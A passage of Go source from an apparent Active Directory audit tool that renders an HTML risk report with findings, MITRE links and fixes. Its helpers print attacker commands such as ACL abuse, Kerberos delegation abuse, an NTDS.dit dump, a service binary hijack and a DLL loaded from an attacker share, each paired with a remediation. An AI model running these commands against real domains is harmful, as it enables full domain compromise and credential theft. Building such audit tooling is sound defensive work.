package report

import (
	"encoding/json"
	"fmt"
	"html/template"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/YakinAnd/morok/internal/analysis"
	"github.com/YakinAnd/morok/internal/graph"
	adldap "github.com/YakinAnd/morok/internal/ldap"
)

// ============================================================
// Template data structures
// ============================================================

// ReportData holds all data passed to the HTML template.
type ReportData struct {
	Domain      string
	GeneratedAt string
	AuthMethod  string // "PTH (NTLM)", "PTT (Kerberos)", "Password", "Anonymous"
	Summary     Summary
	Users       []adldap.LDAPUser
	Groups      []adldap.LDAPGroup
	Computers   []adldap.LDAPComputer
	AttackPaths []graph.AttackPath
	GraphJSON   template.JS
	ForestWide  bool
	// v0.2
	KerberosResult *analysis.KerberosResult
	ACLResult      *analysis.ACLResult
	// v0.3
	DelegationResult *analysis.DelegationResult
	GPOResult        *analysis.GPOResult
	// v0.6
	HygieneResult *analysis.HygieneResult
	PSOResult     *analysis.PSOResult
	// v0.7
	UserPrivGroups map[string]string   // user DN → comma-separated privileged group names
	ADCSResult     *analysis.ADCSResult
	// v0.8.1
	ProtectedUsersResult *analysis.ProtectedUsersResult
	AdminSDHolderResult  *analysis.AdminSDHolderResult
	// v0.8.2
	TrustResult *analysis.TrustResult
	// v0.9.0
	ShadowCredentialsResult *analysis.ShadowCredentialsResult
	LDAPSecurityResult      *analysis.LDAPSecurityResult
	// v0.9.4
	AuditResult *analysis.AuditResult
	// v0.9.6
	SMBSigningResult *analysis.SMBSigningResult
	// v0.9.9
	SYSVOLResult  *analysis.SYSVOLResult
	LAPSACLResult *analysis.LAPSACLResult
	// v1.1 — automatic trust following
	TrustedDomains  []*TrustedDomainEnumResult
	AllDomains      []string // unique source domains across users/groups/computers
	AllComputerOS   []string // unique OS values across computers
	AllGroupNames   []string // unique group SAMAccountNames for filter dropdown
	// header risk summary
	TotalCritical int
	TotalHigh     int
	TotalMedium   int
	// footer
	Version string
	// P2 features
	RiskScore RiskScore
	TopIssues []TopIssue
	// History tab — embedded JSON snapshot for cross-report comparison
	SnapshotJSON template.JS
}

// TrustedDomainEnumResult — status of an automatically-enumerated trusted domain.
// Findings are merged into the main ReportData structs; this is only for display in the Trusts tab.
type TrustedDomainEnumResult struct {
	Domain string
	Error  string // non-empty if enumeration was skipped/failed
}

// Summary holds the executive summary counts.
type Summary struct {
	TotalUsers              int
	TotalGroups             int
	TotalComputers          int
	EnabledUsers            int
	KerberoastableCount     int
	ASREPCount              int
	AdminCount              int
	PasswordNeverExpires    int
	UnconstrainedDelegation int
	AttackPathsCount        int
	CriticalCount           int
	// v0.2
	DangerousACLCount       int
	DCSyncCount             int
	// v0.3
	DelegationCount         int
	WeakPasswordPolicy      bool
	// v0.6
	StaleUsersCount         int
	StaleComputersCount     int
	PasswordInDescCount     int
	KrbtgtAtRisk            bool
	KrbtgtPwdAgeDays        int
	WeakPSOCount            int
	// v0.7
	NoLAPSCount             int
	ADCSTemplateCount       int
	ADCSCriticalCount       int
	// v0.9.0
	ShadowCredCount         int
	// v0.9.4
	AuditFindingCount       int
	RecycleBinEnabled       bool
	MachineAccountQuota     int
}

// GraphNode and GraphEdge are used to serialize the graph for D3.js.
type GraphNode struct {
	ID             string `json:"id"`
	Label          string `json:"label"`
	Type           string `json:"type"`
	AdminCount     bool   `json:"adminCount"`
	Kerberoastable bool   `json:"kerberoastable"`
	ASREPRoastable bool   `json:"asrepRoastable"`
}

type GraphEdge struct {
	Source string `json:"source"`
	Target string `json:"target"`
	Type   string `json:"type"`
}

type D3Graph struct {
	Nodes []GraphNode `json:"nodes"`
	Edges []GraphEdge `json:"edges"`
}

// ============================================================
// Report generation
// ============================================================

// Generate renders the HTML report and writes it to outputPath.
func Generate(
	outputPath string,
	result *adldap.EnumerationResult,
	g *graph.Graph,
	paths []graph.AttackPath,
	kr *analysis.KerberosResult,
	aclResult *analysis.ACLResult,
	dr *analysis.DelegationResult,
	gr *analysis.GPOResult,
	hr *analysis.HygieneResult,
	psoResult *analysis.PSOResult,
	adcsResult *analysis.ADCSResult,
	puResult *analysis.ProtectedUsersResult,
	adminSDResult *analysis.AdminSDHolderResult,
	trustResult *analysis.TrustResult,
	shadowResult   *analysis.ShadowCredentialsResult,
	ldapSecResult  *analysis.LDAPSecurityResult,
	auditResult    *analysis.AuditResult,
	smbResult      *analysis.SMBSigningResult,
	sysvolResult   *analysis.SYSVOLResult,
	lapsACLResult  *analysis.LAPSACLResult,
	trustedDomains []*TrustedDomainEnumResult,
	authMethod string,
) error {

	data := ReportData{
	Domain:               result.Domain,
	GeneratedAt:          time.Now().Format("2006-01-02 15:04:05"),
	Version:              "1.0",
	AuthMethod:           authMethod,
	Users:                result.Users,
	Groups:               result.Groups,
	Computers:            result.Computers,
	AttackPaths:          paths,
	Summary:              buildSummary(result, paths, kr, aclResult, dr, gr, hr, adcsResult, auditResult),
	GraphJSON:            template.JS(buildD3JSON(g, paths)),
	KerberosResult:       kr,
	ACLResult:            aclResult,
	DelegationResult:     dr,
	GPOResult:            gr,
	HygieneResult:        hr,
	PSOResult:            psoResult,
	ADCSResult:           adcsResult,
	ForestWide:           result.ForestWide,
	UserPrivGroups:       buildUserPrivGroups(result),
	ProtectedUsersResult:    puResult,
	AdminSDHolderResult:     adminSDResult,
	TrustResult:             trustResult,
	ShadowCredentialsResult: shadowResult,
	LDAPSecurityResult:      ldapSecResult,
	AuditResult:             auditResult,
	SMBSigningResult:        smbResult,
	SYSVOLResult:            sysvolResult,
	LAPSACLResult:           lapsACLResult,
	TrustedDomains:          trustedDomains,
	AllDomains:              buildAllDomains(result),
	AllComputerOS:           buildAllComputerOS(result),
	AllGroupNames:           buildAllGroupNames(result),
}
	if shadowResult != nil {
		data.Summary.ShadowCredCount = len(shadowResult.Findings)
	}
	data.TotalCritical, data.TotalHigh, data.TotalMedium = CountRiskTotals(&data)
	data.RiskScore = CalculateRiskScore(&data)
	data.TopIssues = BuildTopIssues(&data)
	data.SnapshotJSON = buildSnapshot(&data)

	// parse template
	tmpl, err := template.New("report").Funcs(templateFuncs()).Parse(htmlTemplate)
	if err != nil {
		return fmt.Errorf("template parse error: %w", err)
	}

	// create output file
	f, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("cannot create report file: %w", err)
	}
	defer f.Close()

	// render template to file
	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("template render error: %w", err)
	}

	return nil
}

// ============================================================
// Summary builder
// ============================================================

func buildSummary(
	result *adldap.EnumerationResult,
	paths []graph.AttackPath,
	kr *analysis.KerberosResult,
	aclResult *analysis.ACLResult,
	dr *analysis.DelegationResult,
	gr *analysis.GPOResult,
	hr *analysis.HygieneResult,
	adcsResult *analysis.ADCSResult,
	auditResult *analysis.AuditResult,
) Summary {
	s := Summary{
		TotalUsers:       len(result.Users),
		TotalGroups:      len(result.Groups),
		TotalComputers:   len(result.Computers),
		AttackPathsCount: len(paths),
	}

	for _, u := range result.Users {
		if !u.Enabled {
			continue
		}
		s.EnabledUsers++
		if len(u.SPNs) > 0 {
			s.KerberoastableCount++
		}
		if u.DontReqPreauth {
			s.ASREPCount++
		}
		if u.AdminCount {
			s.AdminCount++
		}
		if u.PasswordNeverExpires {
			s.PasswordNeverExpires++
		}
	}

	for _, c := range result.Computers {
		if c.UnconstrainedDelegation && c.Enabled {
			s.UnconstrainedDelegation++
		}
	}

	for _, p := range paths {
		if p.Depth <= 2 {
			s.CriticalCount++
		}
	}

	if aclResult != nil {
		s.DangerousACLCount = len(aclResult.Findings) + len(aclResult.DCSyncFindings)
		s.DCSyncCount = len(aclResult.DCSyncFindings)
	}

	if dr != nil {
		s.DelegationCount = len(dr.Findings)
	}

	if gr != nil && gr.DefaultPolicy != nil {
		pp := gr.DefaultPolicy
		s.WeakPasswordPolicy = pp.MinLength < 8 || !pp.Complexity || pp.LockoutThreshold == 0
	}

	if hr != nil {
		s.StaleUsersCount = len(hr.StaleUsers)
		s.StaleComputersCount = len(hr.StaleComputers)
		s.PasswordInDescCount = len(hr.PasswordInDesc)
		s.KrbtgtAtRisk = hr.KrbtgtAtRisk
		s.KrbtgtPwdAgeDays = hr.KrbtgtPwdAgeDays
		s.NoLAPSCount = hr.NoLAPSCount
	}

	if adcsResult != nil {
		s.ADCSTemplateCount = len(adcsResult.TemplateFindings)
		for _, f := range adcsResult.TemplateFindings {
			if f.Severity == "Critical" {
				s.ADCSCriticalCount++
			}
		}
	}

	if auditResult != nil {
		s.AuditFindingCount = len(auditResult.Findings)
		s.RecycleBinEnabled = auditResult.RecycleBinEnabled
		s.MachineAccountQuota = auditResult.MachineAccountQuota
	}

	return s
}

// CountRiskTotals aggregates Critical/High/Medium findings across all modules.
// Exported so the CLI footer can use the same counting logic as the HTML header.
func CountRiskTotals(d *ReportData) (critical, high, medium int) {
	bucket := func(sev string) {
		switch sev {
		case "Critical":
			critical++
		case "High":
			high++
		case "Medium":
			medium++
		}
	}
	if d.ACLResult != nil {
		for _, f := range d.ACLResult.Findings {
			bucket(f.Severity)
		}
		for range d.ACLResult.DCSyncFindings {
			critical++
		}
	}
	if d.KerberosResult != nil {
		for _, a := range d.KerberosResult.KerberoastableAccounts {
			bucket(a.Severity)
		}
		for _, a := range d.KerberosResult.ASREPAccounts {
			bucket(a.Severity)
		}
	}
	if d.ADCSResult != nil {
		for _, f := range d.ADCSResult.TemplateFindings {
			bucket(f.Severity)
		}
		for _, f := range d.ADCSResult.CAFindings {
			bucket(f.Severity)
		}
	}
	if d.DelegationResult != nil {
		for _, f := range d.DelegationResult.Findings {
			bucket(f.Severity)
		}
	}
	if d.TrustResult != nil {
		for _, t := range d.TrustResult.Trusts {
			bucket(t.Severity)
		}
		for _, f := range d.TrustResult.FSPs {
			bucket(f.Severity)
		}
	}
	if d.ShadowCredentialsResult != nil {
		for _, f := range d.ShadowCredentialsResult.Findings {
			bucket(f.Severity)
		}
	}
	if d.LDAPSecurityResult != nil {
		for _, f := range d.LDAPSecurityResult.Findings {
			bucket(f.Severity)
		}
	}
	if d.SMBSigningResult != nil {
		for _, f := range d.SMBSigningResult.Findings {
			bucket(f.Severity)
		}
	}
	if d.GPOResult != nil {
		for _, f := range d.GPOResult.GPOACLFindings {
			bucket(f.Severity)
		}
	}
	if d.AdminSDHolderResult != nil {
		for _, f := range d.AdminSDHolderResult.CustomACEs {
			bucket(f.Severity)
		}
	}
	return
}

// buildUserPrivGroups returns a map of userDN → "DA, EA, ..." for users
// that are members of privileged groups.
func buildUserPrivGroups(result *adldap.EnumerationResult) map[string]string {
	privNames := map[string]bool{
		"domain admins":              true,
		"enterprise admins":          true,
		"administrators":             true,
		"backup operators":           true,
		"account operators":          true,
		"schema admins":              true,
		"server operators":           true,
		"print operators":            true,
		"dnsadmins":                  true,
		"group policy creator owners": true,
	}
	// group DN → short name
	groupByDN := make(map[string]string, len(result.Groups))
	for _, g := range result.Groups {
		if privNames[strings.ToLower(g.SAMAccountName)] {
			groupByDN[strings.ToLower(g.DN)] = g.SAMAccountName
		}
	}
	out := make(map[string]string)
	for _, u := range result.Users {
		var found []string
		for _, dn := range u.MemberOf {
			if name, ok := groupByDN[strings.ToLower(dn)]; ok {
				found = append(found, name)
			}
		}
		if len(found) > 0 {
			out[u.DN] = strings.Join(found, ", ")
		}
	}
	return out
}

// ============================================================
func buildAllDomains(result *adldap.EnumerationResult) []string {
	seen := make(map[string]bool)
	for _, u := range result.Users {
		if u.SourceDomain != "" && !seen[u.SourceDomain] {
			seen[u.SourceDomain] = true
		}
	}
	for _, g := range result.Groups {
		if g.SourceDomain != "" && !seen[g.SourceDomain] {
			seen[g.SourceDomain] = true
		}
	}
	for _, c := range result.Computers {
		if c.Domain != "" && !seen[c.Domain] {
			seen[c.Domain] = true
		}
	}
	var domains []string
	for d := range seen {
		domains = append(domains, d)
	}
	sort.Strings(domains)
	return domains
}

func buildAllGroupNames(result *adldap.EnumerationResult) []string {
	seen := make(map[string]bool)
	for _, g := range result.Groups {
		if g.SAMAccountName != "" && !seen[g.SAMAccountName] {
			seen[g.SAMAccountName] = true
		}
	}
	var names []string
	for n := range seen {
		names = append(names, n)
	}
	sort.Strings(names)
	return names
}

func buildAllComputerOS(result *adldap.EnumerationResult) []string {
	seen := make(map[string]bool)
	for _, c := range result.Computers {
		if c.OperatingSystem != "" && !seen[c.OperatingSystem] {
			seen[c.OperatingSystem] = true
		}
	}
	var os []string
	for s := range seen {
		os = append(os, s)
	}
	sort.Strings(os)
	return os
}

// D3.js JSON builder
// ============================================================

// buildD3JSON serializes attack-path nodes and edges to JSON for D3.js.
// Only nodes and edges that appear in discovered paths are included.
func buildD3JSON(g *graph.Graph, paths []graph.AttackPath) string {
	nodeMap := make(map[string]GraphNode)
	edgeMap := make(map[string]GraphEdge)

	for _, path := range paths {
		for _, n := range path.Nodes {
			nodeMap[n.DN] = GraphNode{
				ID:             n.DN,
				Label:          n.SAMAccountName,
				Type:           string(n.Type),
				AdminCount:     n.AdminCount,
				Kerberoastable: n.Kerberoastable,
				ASREPRoastable: n.ASREPRoastable,
			}
		}
		for _, e := range path.Edges {
			key := e.From + "→" + e.To
			edgeMap[key] = GraphEdge{
				Source: e.From,
				Target: e.To,
				Type:   string(e.Type),
			}
		}
	}

	// convert maps to slices
	d3 := D3Graph{}
	for _, n := range nodeMap {
		d3.Nodes = append(d3.Nodes, n)
	}
	for _, e := range edgeMap {
		d3.Edges = append(d3.Edges, e)
	}

	// hand-rolled JSON to avoid an extra encoding/json import
	return marshalD3(d3)
}

// pathExploitResult holds structured exploit/remediation data for a path card.
type pathExploitResult struct {
	Description string
	Commands    []string
	Fix         string
	AuditCmd    string
}

// marshalD3 is a hand-rolled JSON serializer for D3Graph.
func marshalD3(d3 D3Graph) string {
	var sb strings.Builder
	sb.WriteString(`{"nodes":[`)

	for i, n := range d3.Nodes {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf(
			`{"id":%q,"label":%q,"type":%q,"adminCount":%v,"kerberoastable":%v,"asrepRoastable":%v}`,
			n.ID, n.Label, n.Type, n.AdminCount, n.Kerberoastable, n.ASREPRoastable,
		))
	}

	sb.WriteString(`],"edges":[`)

	for i, e := range d3.Edges {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf(
			`{"source":%q,"target":%q,"type":%q}`,
			e.Source, e.Target, e.Type,
		))
	}

	sb.WriteString(`]}`)
	return sb.String()
}

// ============================================================
// Snapshot builder — embedded JSON for History tab cross-report comparison
// ============================================================

// buildSnapshot serializes a compact fingerprint of all findings into JSON.
// The resulting blob is embedded in the HTML report so that other reports can
// load this file as a "baseline" and compute NEW / FIXED / PERSISTENT diffs.
func buildSnapshot(d *ReportData) template.JS {
	type snapScore struct {
		Grade string `json:"grade"`
		Value int    `json:"value"`
	}
	type snapCounts struct {
		Critical int `json:"critical"`
		High     int `json:"high"`
		Medium   int `json:"medium"`
	}
	type snapshot struct {
		V           int                 `json:"v"`
		GeneratedAt string              `json:"generated_at"`
		Domain      string              `json:"domain"`
		Version     string              `json:"version"`
		Score       snapScore           `json:"score"`
		Counts      snapCounts          `json:"counts"`
		Findings    map[string][]string `json:"findings"`
	}

	snap := snapshot{
		V:           1,
		GeneratedAt: d.GeneratedAt,
		Domain:      d.Domain,
		Version:     d.Version,
		Score:       snapScore{Grade: d.RiskScore.Grade, Value: d.RiskScore.Total},
		Counts:      snapCounts{Critical: d.TotalCritical, High: d.TotalHigh, Medium: d.TotalMedium},
		Findings:    make(map[string][]string),
	}
	f := snap.Findings

	if d.KerberosResult != nil {
		for _, acc := range d.KerberosResult.KerberoastableAccounts {
			f["kerberoastable"] = append(f["kerberoastable"], acc.SAMAccountName)
		}
		for _, acc := range d.KerberosResult.ASREPAccounts {
			f["asrep"] = append(f["asrep"], acc.SAMAccountName)
		}
	}

	if d.ACLResult != nil {
		for _, af := range d.ACLResult.Findings {
			f["acl"] = append(f["acl"], af.PrincipalName+"|"+string(af.Right)+"|"+af.TargetName)
		}
	}

	if d.DelegationResult != nil {
		for _, df := range d.DelegationResult.Findings {
			switch df.DelegationType {
			case analysis.DelegationUnconstrained:
				f["unconstrained_deleg"] = append(f["unconstrained_deleg"], df.SAMAccountName)
			case analysis.DelegationConstrained:
				f["constrained_deleg"] = append(f["constrained_deleg"], df.SAMAccountName+"|"+strings.Join(df.AllowedServices, ","))
			case analysis.DelegationRBCD:
				f["rbcd"] = append(f["rbcd"], df.SAMAccountName+"|"+strings.Join(df.TrusteeNames, ","))
			}
		}
	}

	for _, path := range d.AttackPaths {
		if len(path.Nodes) > 0 {
			f["attack_paths"] = append(f["attack_paths"],
				fmt.Sprintf("%s→%s(%dhops)", path.Nodes[0].SAMAccountName, path.TargetGroup, path.Depth))
		}
	}

	if d.ADCSResult != nil {
		for _, tf := range d.ADCSResult.TemplateFindings {
			vulns := make([]string, len(tf.VulnTypes))
			for i, v := range tf.VulnTypes {
				vulns[i] = string(v)
			}
			f["adcs_templates"] = append(f["adcs_templates"], tf.TemplateName+"|"+strings.Join(vulns, "/"))
		}
	}

	if d.ShadowCredentialsResult != nil {
		for _, sf := range d.ShadowCredentialsResult.Findings {
			f["shadow_creds"] = append(f["shadow_creds"], sf.PrincipalName+"|"+sf.TargetName)
		}
	}

	if d.GPOResult != nil {
		for _, af := range d.GPOResult.GPOACLFindings {
			f["gpo_write"] = append(f["gpo_write"], af.PrincipalName+"|"+af.GPOName)
		}
		for _, gpo := range d.GPOResult.GPOFindings {
			if gpo.HasCPassword {
				f["gpp_passwords"] = append(f["gpp_passwords"], gpo.Name)
			}
		}
	}

	b, _ := json.Marshal(snap)
	return template.JS(b)
}

// ============================================================
// Template functions
// ============================================================

func templateFuncs() template.FuncMap {
	return template.FuncMap{
		"inc": func(i int) int { return i + 1 },
		"dec": func(i int) int { return i - 1 },
		"add": func(a, b int) int { return a + b },
		"sub": func(a, b int) int { return a - b },
		"dnToSAM": func(dn string) string {
			// Extract the first RDN value: "CN=Domain Admins,..." → "Domain Admins"
			for _, part := range strings.SplitN(dn, ",", 2) {
				part = strings.TrimSpace(part)
				if eq := strings.Index(part, "="); eq >= 0 {
					return part[eq+1:]
				}
			}
			return dn
		},
		"severityClass": func(count int) string {
			if count == 0 {
				return "badge-ok"
			} else if count <= 3 {
				return "badge-medium"
			}
			return "badge-critical"
		},
		"pathSeverity": func(depth int) string {
			if depth <= 2 {
				return "Critical"
			} else if depth <= 4 {
				return "High"
			}
			return "Medium"
		},
		"pathSeverityClass": func(depth int) string {
			if depth <= 2 {
				return "badge-critical"
			} else if depth <= 4 {
				return "badge-high"
			}
			return "badge-medium"
		},
		"nodeTypeIcon": func(t graph.NodeType) template.HTML {
			switch t {
			case "user":
				return `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;vertical-align:middle"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`
			case "group":
				return `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;vertical-align:middle"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>`
			case "computer":
				return `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;vertical-align:middle"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`
			}
			return `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;vertical-align:middle"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`
		},
		"joinSPNs": func(spns []string) string {
			if len(spns) == 0 {
				return "—"
			}
			return strings.Join(spns, ", ")
		},
		"yesNo": func(b bool) string {
			if b {
				return "Yes"
			}
			return "No"
		},
		"aclExploit": func(right, principal, target, domain string) string {
			switch right {
			case "GenericAll":
				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> add groupMember 'Domain Admins' " + principal
			case "WriteDACL":
				return "dacledit.py -action write -rights FullControl -principal " + principal + " -target " + target + " '" + domain + "/" + principal + ":<pass>'"
			case "WriteOwner":
				return "owneredit.py -action write -new-owner " + principal + " -target " + target + " '" + domain + "/" + principal + ":<pass>'"
			case "ForceChangePassword":
				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> set password " + target + " 'NewPass123!'"
			case "AddMember":
				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> add groupMember '" + target + "' " + principal
			case "GenericWrite":
				return "bloodyAD -u " + principal + " -p '<pass>' -d " + domain + " --host <DC> set object " + target + " -a servicePrincipalName=fake/spn"
			default:
				return "Use BloodHound / dacledit.py to abuse this ACL right"
			}
		},
		"aclFix": func(right string) string {
			switch right {
			case "GenericAll":
				return "Remove GenericAll from non-admin principals; audit AdminSDHolder inheritance"
			case "WriteDACL":
				return "Restrict WriteDACL to Domain Admins; enable Protected Users group for privileged accounts"
			case "WriteOwner":
				return "Set object owner to Domain Admins; enable AdminSDHolder for sensitive objects"
			case "ForceChangePassword":
				return "Remove ForceChangePassword; use 'User must change password at next logon' instead"
			case "AddMember":
				return "Remove AddMember from sensitive groups; use AD Tiered Administration model"
			case "GenericWrite":
				return "Remove GenericWrite; restrict attribute modification to delegated OUs only"
			default:
				return "Review and remove unnecessary privilege delegation for this principal"
			}
		},
		"delegExploit": func(delegType string) string {
			switch delegType {
			case "Unconstrained":
				return "Rubeus.exe monitor /interval:5 /filteruser:DC$ — trigger with SpoolSample.exe <DC> <host> to capture DC TGT → pass-the-ticket as DA"
			case "Constrained":
				return "getST.py -spn cifs/<target> -impersonate administrator '<domain>/<account>:<pass>'"
			case "Resource-Based Constrained":
				return "getST.py -spn cifs/<target> -impersonate administrator -self '<domain>/<account>:<pass>' (RBCD S4U2Self)"
			default:
				return "Use impacket getST.py to abuse S4U2Proxy for service impersonation"
			}
		},
		"delegFix": func(delegType string) string {
			switch delegType {
			case "Unconstrained":
				return "Replace unconstrained delegation with Resource-Based CD; add host to Protected Users; enable 'Account is sensitive and cannot be delegated'"
			case "Constrained":
				return "Restrict constrained delegation to minimum required SPNs; avoid TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition)"
			default:
				return "Audit msDS-AllowedToActOnBehalfOfOtherIdentity; remove unnecessary RBCD grants"
			}
		},
		"mitreBadges": func(key string) template.HTML {
			techs := analysis.LookupTechniques(analysis.MitreKey(key))
			if len(techs) == 0 {
				return ""
			}
			var out string
			for _, t := range techs {
				out += `<a class="mitre-badge" href="` + t.URL() + `" target="_blank" rel="noopener" title="` + t.Name + `">` + t.ID + `</a>`
			}
			return template.HTML(out)
		},
		"mitreForRight": func(right string) template.HTML {
			keyMap := map[string]analysis.MitreKey{
				"GenericAll":          analysis.MitreACLAbuse,
				"WriteDACL":           analysis.MitreACLAbuse,
				"WriteOwner":          analysis.MitreACLAbuse,
				"GenericWrite":        analysis.MitreACLAbuse,
				"ForceChangePassword": analysis.MitreForceChangePwd,
				"AddMember":           analysis.MitreAddMember,
			}
			key, ok := keyMap[right]
			if !ok {
				return ""
			}
			techs := analysis.LookupTechniques(key)
			var out string
			for _, t := range techs {
				out += `<a class="mitre-badge" href="` + t.URL() + `" target="_blank" rel="noopener" title="` + t.Name + `">` + t.ID + `</a>`
			}
			return template.HTML(out)
		},
		"mitreForDeleg": func(delegType string) template.HTML {
			keyMap := map[string]analysis.MitreKey{
				"Unconstrained":           analysis.MitreUnconstrainedDel,
				"Constrained":             analysis.MitreConstrainedDel,
				"Resource-Based Constrained": analysis.MitreRBCD,
			}
			key, ok := keyMap[delegType]
			if !ok {
				return ""
			}
			techs := analysis.LookupTechniques(key)
			var out string
			for _, t := range techs {
				out += `<a class="mitre-badge" href="` + t.URL() + `" target="_blank" rel="noopener" title="` + t.Name + `">` + t.ID + `</a>`
			}
			return template.HTML(out)
		},
		"dialectName": func(d uint16) string {
			switch d {
			case 0x0202:
				return "SMB 2.0.2"
			case 0x0210:
				return "SMB 2.1"
			case 0x0300:
				return "SMB 3.0"
			case 0x0302:
				return "SMB 3.0.2"
			case 0x0311:
				return "SMB 3.1.1"
			default:
				return fmt.Sprintf("0x%04x", d)
			}
		},
		"pathExploitData": func(nodes []graph.Node, targetGroup string) pathExploitResult {
			exploits := map[string]pathExploitResult{
				"Domain Admins": {
					Description: "Transitive DA membership — existing credentials grant full domain compromise. Attacker can authenticate to any domain resource, dump NTDS via DCSync, or pivot via WinRM/SMB.",
					Commands:    []string{},
					Fix:         "Enforce least-privilege; remove transitive paths; apply AD Tiered Administration model.",
					AuditCmd:    "Get-ADGroupMember 'Domain Admins' -Recursive",
				},
				"Enterprise Admins": {
					Description: "Transitive EA membership — forest-wide compromise. Attacker can modify AD schema, manage all domains in forest, and create persistent backdoors at the configuration partition level.",
					Commands:    []string{},
					Fix:         "EA should be empty in steady-state; populate only for forest-level changes (schema updates, domain creation).",
					AuditCmd:    "Get-ADGroupMember 'Enterprise Admins' -Recursive",
				},
				"Group Policy Creator Owners": {
					Description: "Member of GPCO can create new GPOs and link them to OUs/domain. Malicious GPO with scheduled task or startup script → SYSTEM execution on every joined machine at next gpupdate.",
					Commands: []string{
						"New-GPO -Name 'Pwn' | New-GPLink -Target 'DC=domain,DC=local'",
					},
					Fix:      "Remove non-admins from GPCO; restrict GPO creation to dedicated T0 accounts; monitor SYSVOL for new GPO folders.",
					AuditCmd: "Get-GPOReport -All -ReportType XML",
				},
				"Account Operators": {
					Description: "Account Operators can create, modify, and delete user accounts and groups (except those protected by AdminSDHolder). Reset passwords on non-protected admins, then authenticate as them.",
					Commands: []string{
						"Set-ADAccountPassword -Identity <target> -NewPassword (ConvertTo-SecureString 'P@ss1' -AsPlainText -Force) -Reset",
					},
					Fix:      "Empty Account Operators in modern AD; use delegated OUs with specific permissions instead.",
					AuditCmd: "Get-ADGroupMember 'Account Operators'",
				},
				"Backup Operators": {
					Description: "SeBackupPrivilege + SeRestorePrivilege on a Domain Controller allow reading NTDS.dit (offline) and registry SYSTEM hive → extract all domain credentials including krbtgt.",
					Commands: []string{
						"diskshadow /s script.txt",
						"robocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS . NTDS.dit",
						"secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL",
					},
					Fix:      "Backup Operators on DCs is equivalent to DA; restrict to dedicated T0 backup tier only.",
					AuditCmd: "Get-ADGroupMember 'Backup Operators'",
				},
				"Server Operators": {
					Description: "Server Operators can manage services on Domain Controllers. Modify any service binary or its config to execute arbitrary code as SYSTEM.",
					Commands: []string{
						"sc.exe \\\\<DC> config <svc> binPath= \"C:\\path\\payload.exe\"",
						"sc.exe \\\\<DC> start <svc>",
					},
					Fix:      "Empty Server Operators; use JEA (Just Enough Admin) for delegated server management.",
					AuditCmd: "Get-ADGroupMember 'Server Operators'",
				},
				"Print Operators": {
					Description: "SeLoadDriverPrivilege held by Print Operators allows loading arbitrary kernel drivers on the DC → SYSTEM via signed-but-vulnerable driver (BYOVD).",
					Commands:    []string{},
					Fix:         "Empty Print Operators; manage printers via dedicated service accounts with minimal rights.",
					AuditCmd:    "Get-ADGroupMember 'Print Operators'",
				},
				"DnsAdmins": {
					Description: "DnsAdmins can specify a DLL path via dnscmd ServerLevelPluginDll registry key. DNS service runs as SYSTEM on DC and loads the DLL on restart → SYSTEM RCE.",
					Commands: []string{
						"dnscmd <DC> /config /serverlevelplugindll \\\\<attacker>\\share\\evil.dll",
						"sc.exe \\\\<DC> stop dns && sc.exe \\\\<DC> start dns",
					},
					Fix:      "Restrict DnsAdmins; monitor changes to ServerLevelPluginDll registry value.",
					AuditCmd: "Get-ADGroupMember 'DnsAdmins'",
				},
			}

			// Check for special node types first
			for _, n := range nodes {
				if n.Kerberoastable {
					return pathExploitResult{
						Description: "Account " + n.SAMAccountName + " has an SPN registered and is Kerberoastable. Request TGS ticket and crack offline.",
						Commands:    []string{"GetUserSPNs.py domain/user:pass -dc-ip <DC> -request"},
						Fix:         "Use gMSA or set a strong random password (25+ chars) on " + n.SAMAccountName + ".",
						AuditCmd:    "Get-ADUser " + n.SAMAccountName + " -Properties ServicePrincipalName",
					}
				}
				if n.ASREPRoastable {
					return pathExploitResult{
						Description: "Account " + n.SAMAccountName + " has 'Do not require Kerberos preauthentication' enabled. AS-REP hash can be obtained without credentials.",
						Commands:    []string{"GetNPUsers.py domain/ -usersfile users.txt -dc-ip <DC>"},
						Fix:         "Enable Kerberos preauthentication on " + n.SAMAccountName + ".",
						AuditCmd:    "Get-ADUser " + n.SAMAccountName + " -Properties DoesNotRequirePreAuth",
					}
				}
				if n.UnconstrainedDelegation {
					return pathExploitResult{
						Description: "Machine " + n.SAMAccountName + " has unconstrained delegation. Any user authenticating to it exposes their TGT — coerce a DC to authenticate via SpoolSample or PetitPotam.",
						Commands: []string{
							"Rubeus.exe monitor /interval:5 /filteruser:DC$",
							"SpoolSample.exe <DC> <attacker-machine>",
						},
						Fix:      "Replace unconstrained delegation with RBCD or constrained delegation; add to Protected Users.",
						AuditCmd: "Get-ADComputer " + n.SAMAccountName + " -Properties TrustedForDelegation",
					}
				}
			}
